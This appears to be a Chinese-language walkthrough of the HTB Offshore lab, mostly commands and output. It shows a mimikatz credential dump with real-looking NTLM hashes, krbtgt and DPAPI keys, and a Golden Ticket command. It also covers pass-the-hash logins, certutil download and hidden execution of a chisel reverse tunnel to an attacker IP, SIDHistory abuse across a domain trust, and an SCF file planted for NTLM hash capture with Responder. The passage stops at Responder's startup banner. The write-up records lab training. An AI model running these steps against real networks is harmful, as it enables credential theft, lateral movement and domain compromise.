Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-1102
Object Relative ID   : 1102

Credentials:

Object RDN           : MicrosoftDNS


Object RDN           : RootDNSServers


Object RDN           : @


Object RDN           : A.ROOT-SERVERS.NET


Object RDN           : B.ROOT-SERVERS.NET


Object RDN           : C.ROOT-SERVERS.NET


Object RDN           : D.ROOT-SERVERS.NET


Object RDN           : E.ROOT-SERVERS.NET


Object RDN           : F.ROOT-SERVERS.NET


Object RDN           : G.ROOT-SERVERS.NET


Object RDN           : H.ROOT-SERVERS.NET


Object RDN           : I.ROOT-SERVERS.NET


Object RDN           : J.ROOT-SERVERS.NET


Object RDN           : K.ROOT-SERVERS.NET


Object RDN           : L.ROOT-SERVERS.NET


Object RDN           : M.ROOT-SERVERS.NET


Object RDN           : Server


Object RDN           : DFSR-GlobalSettings


Object RDN           : Domain System Volume


Object RDN           : Content


Object RDN           : SYSVOL Share


Object RDN           : Topology


Object RDN           : DC03


Object RDN           : Domain System Volume


Object RDN           : DFSR-LocalSettings


Object RDN           : SYSVOL Subscription


Object RDN           : AdminSDHolder


Object RDN           : Schema Admins

** SAM ACCOUNT **

SAM Username         : Schema Admins
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-518
Object Relative ID   : 518

Credentials:

Object RDN           : Enterprise Admins

** SAM ACCOUNT **

SAM Username         : Enterprise Admins
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-519
Object Relative ID   : 519

Credentials:

Object RDN           : Replicator

** SAM ACCOUNT **

SAM Username         : Replicator
Object Security ID   : S-1-5-32-552
Object Relative ID   : 552

Credentials:

Object RDN           : Account Operators

** SAM ACCOUNT **

SAM Username         : Account Operators
Object Security ID   : S-1-5-32-548
Object Relative ID   : 548

Credentials:

Object RDN           : Server Operators

** SAM ACCOUNT **

SAM Username         : Server Operators
Object Security ID   : S-1-5-32-549
Object Relative ID   : 549

Credentials:

Object RDN           : Backup Operators

** SAM ACCOUNT **

SAM Username         : Backup Operators
Object Security ID   : S-1-5-32-551
Object Relative ID   : 551

Credentials:

Object RDN           : Print Operators

** SAM ACCOUNT **

SAM Username         : Print Operators
Object Security ID   : S-1-5-32-550
Object Relative ID   : 550

Credentials:

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: ea9112d4beb759907688c9e267eff246

Object RDN           : Read-only Domain Controllers

** SAM ACCOUNT **

SAM Username         : Read-only Domain Controllers
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-521
Object Relative ID   : 521

Credentials:

Object RDN           : Domain Controllers

** SAM ACCOUNT **

SAM Username         : Domain Controllers
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-516
Object Relative ID   : 516

Credentials:

Object RDN           : DomainDnsZones


Object RDN           : BCKUPKEY_401a4a03-4bc1-4948-bd0c-bd3d97df53f4 Secret

  * Legacy key
4fc003d208f2cf6bb46e2f484640073f5509e2f789666d28da7e4880d972b677
d5ae1cd8d705c950759157c9bc0af58bd144d62b3893c467caa51b524cede101
e5afc867f34851850c70653bc2f34ee94074058251f5297a5e8ed9de1f6658b6
a0721c302b55bf6d97a5c5f15defc02ae2bf0a01c50bfb060e2c3b57199912b2
3f034a1c1aca4e68f0661da589d0b5e5214d6aa9f2f9471a234517d07c1144cf
b892dfe1bce4fa014f0335d66455d9d63548d908f9dc9634d85f836815ddac8f
e811d9afdbc1dc99299e297a88cda0b5af86d7b221ea52cf38ffb526cdf51bbd
dd90f73ad3630afb65918894391b9dde695388520440891336794541d5d8b389


Object RDN           : BCKUPKEY_P Secret

Link to key with GUID: {401a4a03-4bc1-4948-bd0c-bd3d97df53f4} (not an object GUID)

Object RDN           : BCKUPKEY_8989a9d6-8ed5-4ca7-9ccf-f87b634fc6b2 Secret

  * RSA key
        |Provider name : Microsoft Strong Cryptographic Provider
        |Unique name   : 
        |Implementation: CRYPT_IMPL_SOFTWARE ; 
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003f ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_EXPORT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : YES

Object RDN           : BCKUPKEY_PREFERRED Secret

Link to key with GUID: {8989a9d6-8ed5-4ca7-9ccf-f87b634fc6b2} (not an object GUID)

Object RDN           : Domain Admins

** SAM ACCOUNT **

SAM Username         : Domain Admins
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-512
Object Relative ID   : 512

Credentials:

Object RDN           : Machine


Object RDN           : User


Object RDN           : {C18567B0-6088-4B1C-8739-9EF4B186879F}


Object RDN           : Servers


Object RDN           : Workstations


Object RDN           : S-1-5-21-3620216948-299008490-4232453229-1604


Object RDN           : S-1-5-21-3620216948-299008490-4232453229-513


Object RDN           : MSSP

** SAM ACCOUNT **

SAM Username         : MSSP
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-1114
Object Relative ID   : 1114

Credentials:

Object RDN           : {6AC1786C-016F-11D2-945F-00C04fB984F9}


Object RDN           : MS01

** SAM ACCOUNT **

SAM Username         : MS01$
User Account Control : 00001000 ( WORKSTATION_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-1107
Object Relative ID   : 1107

Credentials:
  Hash NTLM: db505645b78f70ae01dd6cebbe4b2b8b

Object RDN           : Configuration


Object RDN           : ForestDnsZones


Object RDN           : S-1-5-21-524867371-2016665888-3240400722-500


Object RDN           : ADMIN$$$

** SAM ACCOUNT **

SAM Username         : ADMIN$$$
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-3105
Object Relative ID   : 3105

Credentials:

Object RDN           : Administrators

** SAM ACCOUNT **

SAM Username         : Administrators
Object Security ID   : S-1-5-32-544
Object Relative ID   : 544

Credentials:

Object RDN           : bankvault

** SAM ACCOUNT **

SAM Username         : bankvault
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-3113
Object Relative ID   : 3113

Credentials:
  Hash NTLM: 0ce1cb01ade331cdba32d0e1fba338a1

Object RDN           : Machine


Object RDN           : User


Object RDN           : {72BE5C1B-3D10-4542-8995-DC8C2860A020}


Object RDN           : dev


Object RDN           : Key Admins

** SAM ACCOUNT **

SAM Username         : Key Admins
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-526
Object Relative ID   : 526

Credentials:

Object RDN           : {31B2F340-016D-11D2-945F-00C04FB984F9}


Object RDN           : DC03

** SAM ACCOUNT **

SAM Username         : DC03$
User Account Control : 00082000 ( SERVER_TRUST_ACCOUNT TRUSTED_FOR_DELEGATION )
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-1000
Object Relative ID   : 1000

Credentials:
  Hash NTLM: a309490aabcffeea561fb1d8b36607d0

Object RDN           : RID Manager$


Object RDN           : RID Set


Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: f2594c9e60abf7e28e7601db343a7e24

Object RDN           : WS04

** SAM ACCOUNT **

SAM Username         : WS04$
User Account Control : 00001000 ( WORKSTATION_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-1108
Object Relative ID   : 1108

Credentials:
  Hash NTLM: 2abf50d13b5e08b92ac2d90c1d125b99

Object RDN           : dev.ADMIN.OFFSHORE.COM


Object RDN           : DEV$

** SAM ACCOUNT **

SAM Username         : DEV$
User Account Control : 00000820 ( PASSWD_NOTREQD INTERDOMAIN_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-3101
Object Relative ID   : 3101

Credentials:
  Hash NTLM: 47899ea77851ef86cb241ef5e8bd3df7

Object RDN           : CLIENT.OFFSHORE.COM


Object RDN           : CLIENT$

** SAM ACCOUNT **

SAM Username         : CLIENT$
User Account Control : 00000820 ( PASSWD_NOTREQD INTERDOMAIN_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-1216317506-3509444512-4230741538-3104
Object Relative ID   : 3104

Credentials:
  Hash NTLM: 19fdd06b255c0f86892d4d444c27174d



```

## Hash整理
### 重要账号 Hash
#### 1️⃣ Domain Administrator
```plain
Administrator
RID: 500
NTLM: f2594c9e60abf7e28e7601db343a7e24
```

用于：

```plain
psexec
wmiexec
evil-winrm
pass-the-hash
```

---

#### 2️⃣ krbtgt（最重要）
```plain
krbtgt
RID: 502
NTLM: ea9112d4beb759907688c9e267eff246
```

用途：

```plain
Golden Ticket
```

例如：

```plain
ticketer.py \
-nthash ea9112d4beb759907688c9e267eff246 \
-domain ADMIN.OFFSHORE.COM \
-domain-sid S-1-5-21-1216317506-3509444512-4230741538 \
Administrator
```

---

#### 3️⃣ bankvault 用户
```plain
bankvault
RID: 3113
NTLM: 0ce1cb01ade331cdba32d0e1fba338a1
```

可能是题目给的业务用户。

---

### 机器账户 Hash
机器账户也可以用于：

```plain
Pass-the-Hash
Silver Ticket
RBCD
```

#### DC03
```plain
DC03$
NTLM: a309490aabcffeea561fb1d8b36607d0
```

---

#### MS01
```plain
MS01$
NTLM: db505645b78f70ae01dd6cebbe4b2b8b
```

---

#### WS04
```plain
WS04$
NTLM: 2abf50d13b5e08b92ac2d90c1d125b99
```

---

### Trust Account
这些是 **域信任账户**：

#### DEV trust
```plain
DEV$
NTLM: 47899ea77851ef86cb241ef5e8bd3df7
```

类型：

```plain
INTERDOMAIN_TRUST_ACCOUNT
```

用于：

```plain
DEV.ADMIN.OFFSHORE.COM ↔ ADMIN.OFFSHORE.COM
```

---

#### CLIENT trust
```plain
CLIENT$
NTLM: 19fdd06b255c0f86892d4d444c27174d
```

---

### 本地 SAM（DC03）
来自：

```plain
lsadump::sam
```

#### Local Administrator
```plain
Administrator
NTLM: 67e1046be5e785dd9773fb6bbeaad49c
```

这是：

```plain
DC03 本地管理员
```

但在 DC 上：

```plain
本地管理员 ≠ 域管理员
```

通常用处不大。

---

---

### DPAPI Backup Key
这段：

```plain
BCKUPKEY_401a4a03...
BCKUPKEY_P
```

是：

```plain
Domain DPAPI Backup Key
```

可以解密：

```plain
Chrome
Credential Manager
RDP
WiFi
```

用：

```plain
mimikatz dpapi::masterkey
```

## Administrator登录
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q evil-winrm -i 172.16.3.5 -u administrator -H f2594c9e60abf7e28e7601db343a7e24
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
admin\administrator
```

## Getflag
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
OFFSHORE{w@tch_th0s3_3xtra_$ids}
```

## 域内主机
```c
*Evil-WinRM* PS C:\Users\Administrator\Desktop> Get-ADComputer -Filter * -Properties IPv4Address


DistinguishedName : CN=DC03,OU=Domain Controllers,DC=ADMIN,DC=OFFSHORE,DC=COM
DNSHostName       : DC03.ADMIN.OFFSHORE.COM
Enabled           : True
IPv4Address       : 172.16.3.5
Name              : DC03
ObjectClass       : computer
ObjectGUID        : daaa275a-a417-4de8-b042-beddfe3bc8e1
SamAccountName    : DC03$
SID               : S-1-5-21-1216317506-3509444512-4230741538-1000
UserPrincipalName :

DistinguishedName : CN=MS01,OU=Servers,DC=ADMIN,DC=OFFSHORE,DC=COM
DNSHostName       : MS01.ADMIN.OFFSHORE.COM
Enabled           : True
IPv4Address       : 172.16.3.30
Name              : MS01
ObjectClass       : computer
ObjectGUID        : c11bb9c4-1600-4856-be1d-45aff7816bae
SamAccountName    : MS01$
SID               : S-1-5-21-1216317506-3509444512-4230741538-1107
UserPrincipalName :

DistinguishedName : CN=WS04,OU=Workstations,DC=ADMIN,DC=OFFSHORE,DC=COM
DNSHostName       : WS04.ADMIN.OFFSHORE.COM
Enabled           : True
IPv4Address       : 172.16.3.103
Name              : WS04
ObjectClass       : computer
ObjectGUID        : 02f00ccb-c09f-457a-bdf1-79bce3a4293e
SamAccountName    : WS04$
SID               : S-1-5-21-1216317506-3509444512-4230741538-1108
UserPrincipalName :


```

原本想直接域内拿flag，但是遇到了**Kerberos Double Hop Problem**

## 隧道搭建
```c
proxychains -q evil-winrm -i 172.16.3.5 -u administrator -H f2594c9e60abf7e28e7601db343a7e24
*Evil-WinRM* PS C:\Users\Administrator\Desktop> upload ../../tools/chisel/chisel.exe
*Evil-WinRM* PS C:\Users\Administrator\Desktop> Start-Process -WindowStyle Hidden -FilePath .\chisel.exe -ArgumentList "client 10.10.16.2:1332 R:1237:socks"
```

下的太慢了

```c
certutil -urlcache -f http://10.10.16.2/chisel.exe chisel.exe
```

```c
Start-Process -WindowStyle Hidden -FilePath .\chisel.exe -ArgumentList "client 10.10.16.2:1332 R:1237:socks"
```

```c
while ($true) {
    Start-Process -WindowStyle Hidden -FilePath .\chisel.exe -ArgumentList "client 10.10.16.2:1332 R:1237:socks"
    Start-Sleep 10
}
```

## 域内flag
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q crackmapexec smb 172.16.3.5 \
-u administrator \
-H f2594c9e60abf7e28e7601db343a7e24 -x "type C:\Users\Administrator\Desktop\flag.txt"
SMB         172.16.3.5      445    DC03             [*] Windows Server 2016 Standard 14393 x64 (name:DC03) (domain:ADMIN.OFFSHORE.COM) (signing:True) (SMBv1:True)
SMB         172.16.3.5      445    DC03             [+] ADMIN.OFFSHORE.COM\administrator:f2594c9e60abf7e28e7601db343a7e24 (Pwn3d!)
SMB         172.16.3.5      445    DC03             [+] Executed command 
SMB         172.16.3.5      445    DC03             OFFSHORE{w@tch_th0s3_3xtra_$ids}
```

## 域信任关系
```c
*Evil-WinRM* PS C:\Users\Administrator\Desktop> nltest /domain_trusts
List of domain trusts:
    0: DEV dev.ADMIN.OFFSHORE.COM (NT 5) (Forest: 2) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )
    1: CLIENT CLIENT.OFFSHORE.COM (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: foresttrans external )
    2: ADMIN ADMIN.OFFSHORE.COM (NT 5) (Forest Tree Root) (Primary Domain) (Native)
The command completed successfully
```

### Direct Outbound
表示：

```plain
ADMIN 信任 CLIENT
```

即：

```plain
ADMIN → CLIENT
```

---

### Direct Inbound
表示：

```plain
CLIENT 信任 ADMIN
```

即：

```plain
CLIENT → ADMIN
```

---

### 两个同时存在说明
```plain
Bidirectional Trust
```

也就是：

```plain
双向信任
```

结构：

```plain
ADMIN  <──────>  CLIENT
```

### Attr: foresttrans external
这是 **Trust 属性**。

含义：

```plain
Forest Transitive External Trust
```

说明：

#### 1️⃣ foresttrans
表示：

```plain
Forest Transitive
```

信任 **整个森林**。

---

#### 2️⃣ external
说明这是：

```plain
External Trust
```

不是同一个 forest 内部域。

#### 这个 Trust 在攻击里的意义
这条 trust 在靶机里 **非常关键**。

因为它允许：

```plain
ADMIN 域账号
访问
CLIENT 域资源
```

也就是说：

```plain
ADMIN\Administrator
可以对
CLIENT DC 发起 Kerberos 请求
```

这就是 **跨域攻击的基础**。



## CLIENT.OFFSHORE.COM
```c
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ping CLIENT.OFFSHORE.COM

Pinging CLIENT.OFFSHORE.COM [172.16.4.5] with 32 bytes of data:
Reply from 172.16.4.5: bytes=32 time=1ms TTL=127
Reply from 172.16.4.5: bytes=32 time<1ms TTL=127
Reply from 172.16.4.5: bytes=32 time=203ms TTL=127
Reply from 172.16.4.5: bytes=32 time<1ms TTL=127

Ping statistics for 172.16.4.5:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 203ms, Average = 51ms
```

```c
*Evil-WinRM* PS C:\Users\Administrator\Desktop> nltest /dsgetdc:CLIENT.OFFSHORE.COM
           DC: \\DC04.CLIENT.OFFSHORE.COM
      Address: \\172.16.4.5
     Dom Guid: f16f25ff-b5b5-405e-9555-ecca0d81fb89
     Dom Name: CLIENT.OFFSHORE.COM
  Forest Name: CLIENT.OFFSHORE.COM
 Dc Site Name: Default-First-Site-Name
Our Site Name: Default-First-Site-Name
        Flags: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_DC DNS_DOMAIN DNS_FOREST CLOSE_SITE FULL_SECRET WS DS_8 DS_9 DS_10 0x20000
The command completed successfully
```

## IP探测
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents> 1..254 | ForEach-Object {
    $ip = "172.16.4.$_"
    $ping = New-Object System.Net.NetworkInformation.Ping
    $reply = $ping.Send($ip, 100) 
    if ($reply.Status -eq "Success") {
        Write-Host "$ip is UP" -ForegroundColor Green
    }
}
172.16.4.5 is UP
172.16.4.31 is UP
```

## 端口扫描
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents> $ip = "172.16.4.5"
$ports = 1..15000
$runspacePool = [runspacefactory]::CreateRunspacePool(1,100)
$runspacePool.Open()
$jobs = @()
foreach ($port in $ports) {
    $ps = [powershell]::Create()
    $ps.RunspacePool = $runspacePool
    $ps.AddScript({
        param($ip,$port)
        try{
            $client = New-Object System.Net.Sockets.TcpClient
            $iar = $client.BeginConnect($ip,$port,$null,$null)
            if($iar.AsyncWaitHandle.WaitOne(200)){
                $client.EndConnect($iar)
                "Port open $port"
            }
            $client.Close()
        }catch{}
    }).AddArgument($ip).AddArgument($port) | Out-Null
    $job = @{
        Pipe = $ps
        Result = $ps.BeginInvoke()
    }
    $jobs += $job
}
foreach($job in $jobs){
    $output = $job.Pipe.EndInvoke($job.Result)
    if($output){
        $output
    }
}
$runspacePool.Close()
$runspacePool.Dispose()
Port open 135
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q nmap -Pn -sT 172.16.4.31 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-09 11:10 -0400
Nmap scan report for 172.16.4.31
Host is up (0.00s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1653.44 seconds
```

## 横向移动
### Bloodhound-python
```c
proxychains -q bloodhound-python \
    -d ADMIN.OFFSHORE.COM \
    -u Administrator@ADMIN.OFFSHORE.COM \
    --hashes aad3b435b51404eeaad3b435b51404ee:f2594c9e60abf7e28e7601db343a7e24 \
    -ns 172.16.3.5 \
    --dns-tcp \
    -dc DC03.ADMIN.OFFSHORE.COM \
    --auth-method ntlm \
    -c all
```

添加hosts

```c
echo "172.16.4.5  DC04.CLIENT.OFFSHORE.COM CLIENT.OFFSHORE.COM" >> /etc/hosts
```

```c
proxychains -q bloodhound-python \
    -d CLIENT.OFFSHORE.COM \
    -u Administrator@ADMIN.OFFSHORE.COM \
    --hashes aad3b435b51404eeaad3b435b51404ee:f2594c9e60abf7e28e7601db343a7e24 \
    -dc DC04.CLIENT.OFFSHORE.COM \
    -ns 172.16.4.5 \
    --dns-tcp \
    --dns-timeout 30 \
    --auth-method ntlm \
    -c DCOnly
```

```c
proxychains -q bloodhound-python \
    -d CLIENT.OFFSHORE.COM \
    -u Administrator@ADMIN.OFFSHORE.COM \
    --hashes aad3b435b51404eeaad3b435b51404ee:f2594c9e60abf7e28e7601db343a7e24 \
    -dc DC04.CLIENT.OFFSHORE.COM \
    -ns 172.16.4.5 \
    --dns-tcp \
    --dns-timeout 30 \
    --auth-method ntlm \
    -c All 
```

### Bloodhound
![](/image/prolabs/Offshore-73.png)

![](/image/prolabs/Offshore-74.png)

```c
MATCH (u:User)
WHERE u.sidhistory IS NOT NULL
AND u.name CONTAINS "@CLIENT.OFFSHORE.COM"
RETURN u
```

查询CLIENT.OFFSHORE.COM中存在sid history

![](/image/prolabs/Offshore-75.png)

发现BANKVAULT@CLIENT.OFFSHORE.COM

![](/image/prolabs/Offshore-76.png)

我们之前在mimikatz中抓取到过BANKVAULT@ADMIN.OFFSHORE.COM的HASH

```c
bankvault
RID: 3113
NTLM: 0ce1cb01ade331cdba32d0e1fba338a1
```

```c
BANKVAULT@ADMIN.OFFSHORE.COM
Node Type:
User
Object ID:
S-1-5-21-1216317506-3509444512-4230741538-3113
Admin Count:
FALSE
Allows Unconstrained Delegation:
FALSE
Created:
2018-06-25 23:41 EDT (GMT-0400)
Distinguished Name:
CN=BANKVAULT,CN=USERS,DC=ADMIN,DC=OFFSHORE,DC=COM
Do Not Require Pre-Authentication:
FALSE
Domain FQDN:
ADMIN.OFFSHORE.COM
Domain SID:
S-1-5-21-1216317506-3509444512-4230741538
Enabled:
TRUE
Last Collected by BloodHound:
2026-03-09T10:54:04.43863647Z
Last Logon (Replicated):
2018-06-25 23:42 EDT (GMT-0400)
Last Logon:
2018-06-27 15:07 EDT (GMT-0400)
Last Seen by BloodHound:
2026-03-09 06:54 EDT (GMT-0400)
Marked Sensitive:
FALSE
Owner SID:
S-1-5-21-524867371-2016665888-3240400722-500
Password Last Set:
2018-06-25 23:42 EDT (GMT-0400)
Password Never Expires:
FALSE
Password Not Required:
FALSE
SAM Account Name:
bankvault
Sidhistory:
S-1-5-21-524867371-2016665888-3240400722-4109
Trusted For Constrained Delegation:
FALSE
```

```c
BANKVAULT@CLIENT.OFFSHORE.COM
Node Type:
User
Object ID:
S-1-5-21-524867371-2016665888-3240400722-4109
Admin Count:
FALSE
Allows Unconstrained Delegation:
FALSE
Created:
2018-06-15 19:34 EDT (GMT-0400)
Distinguished Name:
CN=BANKVAULT,CN=USERS,DC=CLIENT,DC=OFFSHORE,DC=COM
Do Not Require Pre-Authentication:
FALSE
Domain FQDN:
CLIENT.OFFSHORE.COM
Domain SID:
S-1-5-21-524867371-2016665888-3240400722
Enabled:
FALSE
Last Collected by BloodHound:
2026-03-09T11:17:08.799886507Z
Last Logon (Replicated):
NEVER
Last Logon:
UNKNOWN
Last Seen by BloodHound:
2026-03-09 07:17 EDT (GMT-0400)
Marked Sensitive:
FALSE
Owner SID:
S-1-5-21-524867371-2016665888-3240400722-512
Password Last Set:
2018-06-16 13:55 EDT (GMT-0400)
Password Never Expires:
FALSE
Password Not Required:
FALSE
SAM Account Name:
bankvault
Trusted For Constrained Delegation:
FALSE
```

### SIDHistory
#### 分析
BANKVAULT@ADMIN.OFFSHORE.COM中

最重要的是这一行：

```plain
SIDHistory:
S-1-5-21-524867371-2016665888-3240400722-4109
```

注意这个 SID 的 **Domain SID**：

```plain
S-1-5-21-524867371-2016665888-3240400722
```

这个其实是 **CLIENT.OFFSHORE.COM** 的 Domain SID。

所以：

```plain
BANKVAULT@ADMIN
拥有一个
CLIENT 域的 SIDHistory
```

#### 原理
SIDHistory 用于 **域迁移**。

例如：

```plain
旧域: CLIENT.OFFSHORE.COM
新域: ADMIN.OFFSHORE.COM
```

迁移用户时：

```plain
旧 SID → 存入 SIDHistory
```

这样旧资源权限仍然有效。

#### 漏洞
认证时：

Windows 会同时检查：

```plain
Primary SID
+
SIDHistory
```

所以：

```plain
BANKVAULT@ADMIN
```

在 **CLIENT 域资源上**

会被当成：

```plain
SIDHistory 中的用户
```

#### 验证
```c
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/offshore/blood]
└─# proxychains -q crackmapexec smb DC04.CLIENT.OFFSHORE.COM \
-u bankvault \
-H 0ce1cb01ade331cdba32d0e1fba338a1 \
-d ADMIN.OFFSHORE.COM
SMB         DC04.CLIENT.OFFSHORE.COM 445    DC04             [*] Windows Server 2016 Standard 14393 x64 (name:DC04) (domain:ADMIN.OFFSHORE.COM) (signing:True) (SMBv1:True)
SMB         DC04.CLIENT.OFFSHORE.COM 445    DC04             [+] ADMIN.OFFSHORE.COM\bankvault:0ce1cb01ade331cdba32d0e1fba338a1 
```

### Bankvault-Smb
```c
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/offshore/blood]
└─# proxychains -q crackmapexec smb 172.16.4.5 \
-u bankvault \
-H 0ce1cb01ade331cdba32d0e1fba338a1 \
-d ADMIN.OFFSHORE.COM \
--shares
SMB         172.16.4.5      445    DC04             [*] Windows Server 2016 Standard 14393 x64 (name:DC04) (domain:ADMIN.OFFSHORE.COM) (signing:True) (SMBv1:True)
SMB         172.16.4.5      445    DC04             [+] ADMIN.OFFSHORE.COM\bankvault:0ce1cb01ade331cdba32d0e1fba338a1 
SMB         172.16.4.5      445    DC04             [+] Enumerated shares
SMB         172.16.4.5      445    DC04             Share           Permissions     Remark
SMB         172.16.4.5      445    DC04             -----           -----------     ------
SMB         172.16.4.5      445    DC04             ADMIN$                          Remote Admin
SMB         172.16.4.5      445    DC04             C$                              Default share
SMB         172.16.4.5      445    DC04             IPC$                            Remote IPC
SMB         172.16.4.5      445    DC04             NETLOGON        READ            Logon server share 
SMB         172.16.4.5      445    DC04             SYSVOL          READ            Logon server share 
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q crackmapexec smb 172.16.4.31 \
-u bankvault \                            
-H 0ce1cb01ade331cdba32d0e1fba338a1 \    
-d ADMIN.OFFSHORE.COM \
--shares
SMB         172.16.4.31     445    MS02             [*] Windows Server 2016 Standard 14393 x64 (name:MS02) (domain:ADMIN.OFFSHORE.COM) (signing:False) (SMBv1:True)
SMB         172.16.4.31     445    MS02             [+] ADMIN.OFFSHORE.COM\bankvault:0ce1cb01ade331cdba32d0e1fba338a1 
SMB         172.16.4.31     445    MS02             [+] Enumerated shares
SMB         172.16.4.31     445    MS02             Share           Permissions     Remark
SMB         172.16.4.31     445    MS02             -----           -----------     ------
SMB         172.16.4.31     445    MS02             ADMIN$                          Remote Admin
SMB         172.16.4.31     445    MS02             Banking_Data    READ,WRITE      
SMB         172.16.4.31     445    MS02             C$                              Default share
SMB         172.16.4.31     445    MS02             IPC$                            Remote IPC
```

我们发现bankvault对Banking_Data具有写入权限

### 水坑攻击
+ 为什么空文件夹反而引起了注意？ 如果一个共享文件夹叫 Banking_Data，且允许写入，但里面却是空的，这意味着什么？
+ 这通常意味着存在一个高权限的人（管理员）或者自动化脚本（计划任务）会定期来查看、清理这个文件夹。这就是一个完美的“水坑”！

#### 创建scf文件
##### 原理
SCF (Shell Command File) 是一种古老的 Windows 控制文件，最初设计用于执行资源管理器操作，比如“显示桌面”。

为什么它在渗透中很有用？

+ 自动触发：当 Windows 用户打开包含 .scf 文件的文件夹时，Windows 资源管理器会自动尝试读取该文件的图标（Icon）。
+ 强制认证：如果我们在 SCF 文件的图标路径（IconFile）中填入一个远程 SMB 地址（例如 \\172.16.3.5\icon.ico），Windows 就会尝试去那个 IP 下载图标。
+ 截获 Hash：在尝试连接远程 SMB 服务器时，Windows 会自动发送当前登录用户的 NTLMv2 Hash 进行身份验证。攻击者只需在远端开启监听（如 Responder 或 Inveigh），就能拿到这个 Hash。

##### 利用
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# vi test.scf  

┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# cat test.scf 
[Shell]
Command=2
IconFile=\\10.10.16.2\1.ico
[Taskbar]
Command=ToggleDesktop
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q impacket-smbclient \          
ADMIN.OFFSHORE.COM/bankvault@172.16.4.31 \
-hashes :0ce1cb01ade331cdba32d0e1fba338a1
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
Banking_Data
C$
IPC$
# use Banking_Data
# put test.scf
# ls
drw-rw-rw-          0  Mon Mar  9 09:34:19 2026 .
drw-rw-rw-          0  Mon Mar  9 09:34:19 2026 ..
-rw-rw-rw-         78  Mon Mar  9 09:34:21 2026 test.scf
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# responder -v -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
